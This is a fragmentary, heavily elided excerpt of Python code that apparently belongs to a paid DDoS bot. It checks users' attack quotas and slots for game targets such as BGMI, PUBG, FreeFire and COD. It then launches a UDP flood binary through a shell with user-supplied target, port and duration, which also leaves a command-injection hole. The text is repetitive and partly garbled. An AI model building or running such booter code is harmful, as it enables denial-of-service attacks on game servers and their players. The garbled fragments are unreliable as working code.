            ...
            if len(command) == 4:
                ...
                # Validate time
                    ...
                    if user_plans[username]['attacks'] < time:
                        ...
                        response = "[𝐁𝐆𝐌𝐈] 𝐀𝐥𝐥 𝟑 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                    else:
                        # Perform the attack
            ...
            if len(command) == 4:
                ...
                # Validate time
                    ...
                    if user_plans[username]['attacks'] < time:
                        ...
                        response = "[𝐏𝐔𝐁𝐆] 𝐀𝐥𝐥 𝟑 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                    else:
                        # Perform the attack
                        full_command = f"./GAME-UDP {target} {port} {time} 10"
                        subprocess.Popen(full_command, shell=True)
            ...
            if len(command) == 4:
                ...
                # Validate time
                    ...
                    if user_plans[username]['attacks'] < time:
                        ...
                        response = "[𝐅𝐑𝐄𝐄𝐅𝐈𝐑𝐄] 𝐀𝐥𝐥 𝟑 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                    else:
                        # Perform the attack
                        full_command = f"./GAME-UDP {target} {port} {time} 10"
                        subprocess.Popen(full_command, shell=True)
            ...
            if len(command) == 4:
                ...
                # Validate time
                    ...
                    if user_plans[username]['attacks'] < time:
                        ...
                        response = "[𝐂𝐎𝐃] 𝐀𝐥𝐥 𝟑 𝐬𝐥𝐨𝐭𝐬 𝐚𝐫𝐞 𝐢𝐧 𝐮𝐬𝐞. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐮𝐧𝐭𝐢𝐥 𝐨𝐧𝐞 𝐨𝐟 𝐭𝐡𝐞𝐦 𝐟𝐢𝐧𝐢𝐬𝐡."
                    else:
                        # Perform the attack
                        full_command = f"./GAME-UDP {target} {port} {time} 10"
                        subprocess.Popen(full_command, shell=True)
